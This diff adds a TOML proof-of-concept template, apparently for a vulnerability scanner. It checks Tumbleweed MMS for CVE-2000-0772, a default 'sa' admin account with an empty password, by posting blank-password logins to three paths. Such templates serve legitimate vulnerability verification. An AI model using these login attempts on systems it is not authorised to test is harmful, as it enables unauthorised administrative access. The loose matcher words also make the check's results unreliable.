@@ -1,0 +1,83 @@
+[info]
+author = "AVE"
+description = "Tumbleweed Messaging Management System (MMS) 4.6 及更早版本安装时默认创建 sa 管理员账户且无密码。攻击者可尝试使用 sa 用户名和空密码登录管理 Web 接口，验证是否存在该默认账户。"
+id = "POC-AVE-2000-0923"
+name = "Tumbleweed MMS 默认 sa 账户空密码 PoC"
+severity = "high"
+tags = ["ave-2000-0923"]
+vuln_id = [
+    "CVE-2000-0772",
+    "AVE-2000-0923",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/login"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=sa&password="
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Welcome",
+    "Dashboard",
+    "admin",
+    "session",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/admin/login"
+protocol = "http"
+
+[poc.requests.body]
+content = "user=sa&passwd=&login=Login"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Welcome",
+    "Dashboard",
+    "admin",
+    "session",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/mms/login"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=sa&password="
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Welcome",
+    "Dashboard",
+    "admin",
+    "session",
+]
